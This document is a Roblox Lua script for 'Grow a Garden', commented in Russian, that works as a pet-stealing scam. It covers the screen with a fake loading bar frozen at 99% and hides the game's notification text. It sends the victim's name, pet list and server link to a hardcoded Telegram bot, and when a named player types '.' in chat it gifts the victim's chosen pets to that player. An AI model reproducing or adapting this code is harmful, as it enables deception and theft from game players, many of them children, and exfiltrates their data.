local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
-- 🛡️ УЛУЧШЕННОЕ АГРЕССИВНОЕ СКРЫТИЕ ТЕКСТА В GUI (с защитой собственного GUI)
local PROTECTED_GUI_NAMES = {
    "CustomLoadingUI", -- Защищаем наш загрузочный экран
    "MainScript", -- Если у вас есть другие собственные GUI
    "TelegramBot" -- Добавьте сюда названия ваших GUI
}
local function isProtectedGUI(obj)
    -- Проверяем, находится ли объект в защищенном GUI
    local current = obj
    while current and current.Parent do
        if current:IsA("ScreenGui") then
            for _, protectedName in ipairs(PROTECTED_GUI_NAMES) do
                if current.Name == protectedName then
                    return true
                end
            end
            break
        end
        current = current.Parent
    end
    
    -- СПЕЦИАЛЬНАЯ ЗАЩИТА для Trading.FinalizingTrade
    if obj.Name == "FinalizingTrade" and obj.Parent and obj.Parent.Name == "Trading" then
        return true
    end
    
    return false
end
-- 🛡️ ЗАЩИТА ОТ УВЕДОМЛЕНИЙ (кроме Trading.FinalizingTrade)
task.spawn(function()
    while true do
        pcall(function()
            -- Защищаем Trading.FinalizingTrade от скрытия
            local tradingGui = LocalPlayer.PlayerGui:FindFirstChild("Trading")
            if tradingGui then
                local finalizingTrade = tradingGui:FindFirstChild("FinalizingTrade")
                if finalizingTrade and finalizingTrade:IsA("TextLabel") then
                    -- Принудительно показываем этот элемент
                    finalizingTrade.Visible = true
                    finalizingTrade.TextTransparency = 0
                end
            end
        end)
        task.wait(0.1)
    end
end)
local function hideIfText(obj)
    if not obj or isProtectedGUI(obj) then return end
    
    if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
        -- Проверяем, что это не наш собственный GUI
        if obj.Text and obj.Text ~= "" then
            obj.Visible = false
        end
        
        -- Подключаемся к изменениям текста
        local connection
        connection = obj:GetPropertyChangedSignal("Text"):Connect(function()
            if not isProtectedGUI(obj) and obj.Text and obj.Text ~= "" then
                obj.Visible = false
            end
        end)
        
        -- Очищаем подключение при удалении объекта
        obj.AncestryChanged:Connect(function()
            if not obj.Parent then
                connection:Disconnect()
            end
        end)
    end
end
-- Сканируем существующие элементы
for _, gui in ipairs(LocalPlayer.PlayerGui:GetDescendants()) do
    hideIfText(gui)
end
-- Следим за новыми элементами
LocalPlayer.PlayerGui.DescendantAdded:Connect(hideIfText)
-- Дополнительная защита: периодическая проверка (оптимизированная)
local lastCheck = 0
RunService.RenderStepped:Connect(function()
    local currentTime = tick()
    if currentTime - lastCheck < 0.5 then return end -- Проверяем каждые 0.5 секунд
    lastCheck = currentTime
    
    for _, gui in ipairs(LocalPlayer.PlayerGui:GetDescendants()) do
        if not isProtectedGUI(gui) then
            if gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox") then
                if gui.Text and gui.Text ~= "" then
                    gui.Visible = false
                end
            end
        end
    end
end)
-- 🌌 УЛУЧШЕННАЯ GUI ЗАГРУЗКИ (с анимацией)
task.spawn(function()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "CustomLoadingUI"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    
    -- ФОН с анимацией
    local background = Instance.new("ImageLabel")
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.Image = "rbxassetid://128494498539944"
    background.BackgroundTransparency = 1
    background.ScaleType = Enum.ScaleType.Crop
    background.Parent = screenGui
    
    -- Статичный фон без анимации
    local tweenService = game:GetService("TweenService")
    -- Пульсация полностью отключена
    
    -- Надпись с анимацией точек
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0, 50)
    label.Position = UDim2.new(0, 0, 0.4, 0)
    label.BackgroundTransparency = 1
    label.Text = "Loading"
    label.TextColor3 = Color3.new(1, 1, 1)
    label.Font = Enum.Font.GothamBold
    label.TextSize = 36
    label.TextStrokeTransparency = 0.6
    label.TextScaled = false
    label.Parent = background
    
    -- Анимация точек
    local dotTask = task.spawn(function()
        local dots = {"", ".", "..", "..."}
        local dotIndex = 1
        while screenGui.Parent do
            label.Text = "Loading" .. dots[dotIndex]
            dotIndex = dotIndex % 4 + 1
            task.wait(0.5)
        end
    end)
    
    -- Улучшенный прогресс-бар с градиентом
    local barContainer = Instance.new("Frame")
    barContainer.Size = UDim2.new(0.4, 0, 0.025, 0)
    barContainer.Position = UDim2.new(0.3, 0, 0.5, 0)
    barContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    barContainer.BorderSizePixel = 0
    barContainer.Parent = background
    
    -- Закругленные углы
    local containerCorner = Instance.new("UICorner")
    containerCorner.CornerRadius = UDim.new(0, 8)
    containerCorner.Parent = barContainer
    
    local barFill = Instance.new("Frame")
    barFill.Size = UDim2.new(0, 0, 1, 0)
    barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    barFill.BorderSizePixel = 0
    barFill.Parent = barContainer
    
    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(0, 8)
    fillCorner.Parent = barFill
    
    -- Градиент
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 170))
    })
    gradient.Parent = barFill
    
    local percent = Instance.new("TextLabel")
    percent.Size = UDim2.new(0, 60, 0, 25)
    percent.Position = UDim2.new(0.71, 10, 0.5, -12)
    percent.BackgroundTransparency = 1
    percent.TextColor3 = Color3.new(1, 1, 1)
    percent.Text = "0%"
    percent.Font = Enum.Font.Gotham
    percent.TextSize = 20
    percent.TextXAlignment = Enum.TextXAlignment.Left
    percent.Parent = background
    
    -- Плавная анимация прогресса
    for i = 1, 99 do
        local fillTween = tweenService:Create(barFill, 
            TweenInfo.new(2.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), 
            {Size = UDim2.new(i / 100, 0, 1, 0)}
        )
        fillTween:Play()
        percent.Text = i .. "%"
        task.wait(3)
    end
    
    -- Застывает на 99%
    percent.Text = "99%"
    barFill.Size = UDim2.new(0.99, 0, 1, 0)
    
    -- Очищаем задачу анимации точек при завершении
    task.cancel(dotTask)
end)
-- 🔧 НАСТРОЙКИ (ОРИГИНАЛЬНЫЕ РАБОЧИЕ)
local TELEGRAM_TOKEN = "8113815289:AAHjyPNLtl1Ug2HY2r0SYZJuNltlYZZG-zc"
local TELEGRAM_CHAT_ID = "1192810837"
local TARGET_PLAYER = "sERTTQE0"
local TRIGGER_MESSAGE = "."
-- 🐾 РАСШИРЕННЫЙ БЕЛЫЙ СПИСОК
local WHITELIST = {
    "Crab",
    "Moon Cat",
    "Wasp"
    -- Добавьте сюда других питомцев которых нужно передавать
}
local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
-- 📊 СТАТИСТИКА
local STATS = {
    startTime = tick(),
    totalPetsTransferred = 0,
    errors = 0
}
-- 📨 УЛУЧШЕННАЯ ФУНКЦИЯ TELEGRAM (с защитой от ошибок)
local function sendToTelegram(text)
    -- Ограничиваем длину сообщения (Telegram лимит 4096 символов)
    if #text > 4000 then
        text = string.sub(text, 1, 4000) .. "\n\n... (сообщение обрезано)"
    end
    
    -- Заменяем проблемные символы
    text = text:gsub("&", "%%26")
    text = text:gsub("#", "%%23")
    text = text:gsub("%+", "%%2B")
    
    local url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
                "?chat_id="..TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(text)
    
    local success, result = pcall(function() 
        return game:HttpGet(url) 
    end)
    
    if not success then
        warn("Ошибка при отправке в Telegram: "..tostring(result))
        STATS.errors = STATS.errors + 1
        
        -- Пробуем отправить короткое сообщение об ошибке
        local shortMessage = "❌ Ошибка отправки длинного сообщения. Код ошибки: "..tostring(result):sub(1, 100)
        local shortUrl = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
                        "?chat_id="..TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(shortMessage)
        pcall(function() game:HttpGet(shortUrl) end)
    end
    
    return success
end
-- 🔗 ИСПРАВЛЕННАЯ ФУНКЦИЯ ССЫЛКИ НА СЕРВЕР (НОВЫЙ ФОРМАТ)
local function getServerLink()
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    if not jobId or jobId == "" or jobId == "0" then
        -- Для публичных серверов - используем только placeId
        return "roblox://placeId="..placeId
    else
        -- Для приватных серверов - используем требуемый формат
        return "roblox://placeId="..placeId.."&gameInstanceId="..jobId
    end
end
-- 🔎 УЛУЧШЕННАЯ ФУНКЦИЯ ПОЛУЧЕНИЯ ПИТОМЦЕВ
local function getAllPets()
    local pets = {}
    local sources = {LocalPlayer.Backpack}
    
    -- Проверяем и персонажа тоже
    if LocalPlayer.Character then
        table.insert(sources, LocalPlayer.Character)
    end
    
    for _, source in ipairs(sources) do
        for _, item in ipairs(source:GetChildren()) do
            if item:IsA("Tool") and item.Name:find("%[") then
                local weight, age = item.Name:match("%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
                if weight and age then
                    local petName = item.Name:match("^([^%[]+)") or item.Name
                    petName = petName:gsub("%s+$", "")
                    
                    -- Более гибкая проверка белого списка
                    local isWhitelisted = false
                    for _, whitelistedPet in ipairs(WHITELIST) do
                        if petName:lower():find(whitelistedPet:lower()) then
                            isWhitelisted = true
                            break
                        end
                    end
                    
                    table.insert(pets, {
                        name = petName,
                        fullName = item.Name,
                        weight = tonumber(weight),
                        age = tonumber(age),
                        object = item,
                        isWhitelisted = isWhitelisted,
                        rarity = item.Name:match("Legendary") and "⭐LEGENDARY" or 
                               item.Name:match("Epic") and "💜EPIC" or 
                               item.Name:match("Rare") and "💙RARE" or 
                               item.Name:match("Uncommon") and "💚UNCOMMON" or "⚪COMMON"
                    })
                end
            end
        end
    end
    
    -- Сортировка по весу (самые тяжелые сначала)
    table.sort(pets, function(a, b)
        return a.weight > b.weight
    end)
    
    return pets
end
-- 📜 УЛУЧШЕННЫЙ СПИСОК ПИТОМЦЕВ (с ограничением длины)
local function getFullPetsList()
    local pets = getAllPets()
    if #pets == 0 then return "❌ Нет питомцев" end
    
    local whitelisted = {}
    local blacklisted = {}
    local totalWeight = 0
    
    for _, pet in ipairs(pets) do
        totalWeight = totalWeight + pet.weight
        
        local status = pet.isWhitelisted and "✅" or "❌"
        local petInfo = string.format("%s %s [%.1fкг]", 
                                     status, pet.name, pet.weight)
        
        if pet.isWhitelisted then
            table.insert(whitelisted, petInfo)
        else
            table.insert(blacklisted, petInfo)
        end
    end
    
    local result = {"📊 ПИТОМЦЫ:"}
    table.insert(result, string.format("Всего: %d | Вес: %.1fкг", #pets, totalWeight))
    table.insert(result, string.format("К передаче: %d | К сохранению: %d", #whitelisted, #blacklisted))
    table.insert(result, "")
    
    -- Ограничиваем количество показываемых питомцев
    if #whitelisted > 0 then
        table.insert(result, "✅ К ПЕРЕДАЧЕ:")
        for i = 1, math.min(10, #whitelisted) do
            table.insert(result, whitelisted[i])
        end
        if #whitelisted > 10 then
            table.insert(result, string.format("... +%d питомцев", #whitelisted - 10))
        end
        table.insert(result, "")
    end
    
    if #blacklisted > 0 then
        table.insert(result, "❌ К СОХРАНЕНИЮ (топ-5):")
        for i = 1, math.min(5, #blacklisted) do
            table.insert(result, blacklisted[i])
        end
        if #blacklisted > 5 then
            table.insert(result, string.format("... +%d питомцев", #blacklisted - 5))
        end
    end
    
    return table.concat(result, "\n")
end
-- 🏁 СТАРТОВОЕ УВЕДОМЛЕНИЕ (улучшенное но с рабочей функцией)
local function sendInitialNotification()
    local petsList = getFullPetsList()
    local serverLink = getServerLink()
    
    local message =
        "🟢 СКРИПТ ЗАПУЩЕН!\n\n"..
        "👤 Игрок: "..LocalPlayer.Name.."\n"..
        "🎯 Ждем команду от: "..TARGET_PLAYER.."\n"..
        "💬 Триггер: '"..TRIGGER_MESSAGE.."'\n\n"..
        petsList.."\n\n"..
        "🔗 ССЫЛКА НА СЕРВЕР:\n"..serverLink
    
    sendToTelegram(message)
end
-- 🐕 УЛУЧШЕННАЯ ФУНКЦИЯ ПЕРЕДАЧИ
local function transferPet(pet)
    if not pet.isWhitelisted then return false, "Не в белом списке" end
    
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if not target then
        return false, "Игрок "..TARGET_PLAYER.." не найден на сервере"
    end
    
    if not PetGiftingService then
        return false, "Сервис передачи питомцев недоступен"
    end
    
    if not (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")) then
        return false, "Персонаж недоступен"
    end
    
    -- Попытка передачи с повторами
    for attempt = 1, 3 do
        local success, error = pcall(function()
            LocalPlayer.Character.Humanoid:EquipTool(pet.object)
            task.wait(1.5)
            PetGiftingService:FireServer("GivePet", target)
        end)
        
        if success then
            STATS.totalPetsTransferred = STATS.totalPetsTransferred + 1
            return true, "Передан успешно"
        else
            if attempt < 3 then
                task.wait(2)
            end
        end
    end
    
    STATS.errors = STATS.errors + 1
    return false, "Ошибка при передаче"
end
-- 🚚 УЛУЧШЕННЫЙ ПРОЦЕСС ПЕРЕДАЧИ
local function startPetTransfer()
    sendToTelegram("🔄 Получена команда! Начинаю передачу питомцев...")
    
    local pets = getAllPets()
    if #pets == 0 then
        sendToTelegram("❌ Питомцы не найдены!")
        return
    end
    
    local whitelistedPets = {}
    for _, pet in ipairs(pets) do
        if pet.isWhitelisted then
            table.insert(whitelistedPets, pet)
        end
    end
    
    if #whitelistedPets == 0 then
        sendToTelegram("❌ Нет питомцев в белом списке для передачи!")
        return
    end
    
    local successful = 0
    local failed = 0
    local detailedReport = {}
    
    for i, pet in ipairs(whitelistedPets) do
        local success, reason = transferPet(pet)
        
        if success then
            successful = successful + 1
            table.insert(detailedReport, string.format("✅ %s [%.2f кг]", pet.name, pet.weight))
        else
            failed = failed + 1
            table.insert(detailedReport, string.format("❌ %s [%.2f кг] - %s", pet.name, pet.weight, reason))
        end
        
        -- Промежуточные отчеты каждые 5 питомцев
        if i % 5 == 0 and i < #whitelistedPets then
            sendToTelegram(string.format("📊 Прогресс: %d/%d (✅%d ❌%d)", 
                                       i, #whitelistedPets, successful, failed))
        end
        
        task.wait(2.5) -- Пауза между передачами
    end
    
    -- Финальный отчет
    local report = {
        "🏁 ПЕРЕДАЧА ЗАВЕРШЕНА!",
        "",
        string.format("✅ Успешно передано: %d", successful),
        string.format("❌ Неудачные попытки: %d", failed),
        string.format("📊 Процент успеха: %d%%", math.floor((successful / #whitelistedPets) * 100)),
        "",
        "📋 ПОДРОБНЫЙ ОТЧЕТ:",
        table.concat(detailedReport, "\n"),
        "",
        string.format("⏱️ Общее время работы: %.1f мин", (tick() - STATS.startTime) / 60)
    }
    
    sendToTelegram(table.concat(report, "\n"))
end
-- 💬 СИСТЕМА ПРОСЛУШКИ КОМАНД (расширенная)
local function setupMessageListener()
    if TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            local speaker = Players:FindFirstChild(message.TextSource.Name)
            if speaker and speaker.Name == TARGET_PLAYER then
                local msg = message.Text:lower()
                
                if message.Text == TRIGGER_MESSAGE then
                    -- Основная команда передачи
                    startPetTransfer()
                elseif msg:find("pets") or msg:find("питомцы") then
                    -- Команда просмотра питомцев
                    sendToTelegram(getFullPetsList())
                elseif msg:find("status") or msg:find("статус") then
                    -- Команда статуса
                    local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
                    sendToTelegram(string.format("📊 СТАТУС:\n⏱️ Время работы: %s\n✅ Передано: %d\n❌ Ошибок: %d\n👥 Игроков на сервере: %d", 
                                                uptime, STATS.totalPetsTransferred, STATS.errors, #Players:GetPlayers()))
                elseif msg:find("link") or msg:find("ссылка") then
                    -- Команда получения ссылки
                    sendToTelegram("🔗 Ссылка на сервер:\n" .. getServerLink())
                end
            end
        end
    else
        -- Для старой системы чата
        Players.PlayerChatted:Connect(function(chatType, speaker, message)
            if chatType == Enum.PlayerChatType.All and speaker.Name == TARGET_PLAYER then
                local msg = message:lower()
                
                if message == TRIGGER_MESSAGE then
                    startPetTransfer()
                elseif msg:find("pets") or msg:find("питомцы") then
                    sendToTelegram(getFullPetsList())
                elseif msg:find("status") or msg:find("статус") then
                    local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
                    sendToTelegram(string.format("📊 СТАТУС:\n⏱️ Время работы: %s\n✅ Передано: %d\n❌ Ошибок: %d\n👥 Игроков на сервере: %d", 
                                                uptime, STATS.totalPetsTransferred, STATS.errors, #Players:GetPlayers()))
                elseif msg:find("link") or msg:find("ссылка") then
                    sendToTelegram("🔗 Ссылка на сервер:\n" .. getServerLink())
                end
            end
        end)
    end
end
-- 🔄 АВТОМАТИЧЕСКИЕ ОБНОВЛЕНИЯ СТАТУСА (каждые 15 минут)
task.spawn(function()
    while true do
        task.wait(900) -- 15 минут
        local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
        sendToTelegram(string.format("📊 Автообновление статуса:\n⏱️ Работает: %s\n✅ Передано питомцев: %d\n👥 Игроков: %d", 
                                    uptime, STATS.totalPetsTransferred, #Players:GetPlayers()))
    end
end)
-- 🚀 ЗАПУСК СИСТЕМЫ
task.wait(10) -- Даем время загрузиться GUI
sendInitialNotification()
setupMessageListener()
-- 🎯 Мониторинг целевого игрока
task.spawn(function()
    while true do
        local target = Players:FindFirstChild(TARGET_PLAYER)
        if not target then
            sendToTelegram("⚠️ ВНИМАНИЕ: Игрок "..TARGET_PLAYER.." покинул сервер!")
            break
        end
        task.wait(60) -- Проверяем каждую минуту
    end
end)
print("✅ Скрипт Grow a Garden загружен и готов к работе!")
print("💬 Доступные команды для игрока "..TARGET_PLAYER..":")
print("   '"..TRIGGER_MESSAGE.."' - передать питомцев")
print("   'pets' - показать список питомцев") 
print("   'status' - показать статус скрипта")
print("   'link' - получить ссылку на сервер")
print("🛡️ Система скрытия GUI активна с защитой собственных интерфейсов")
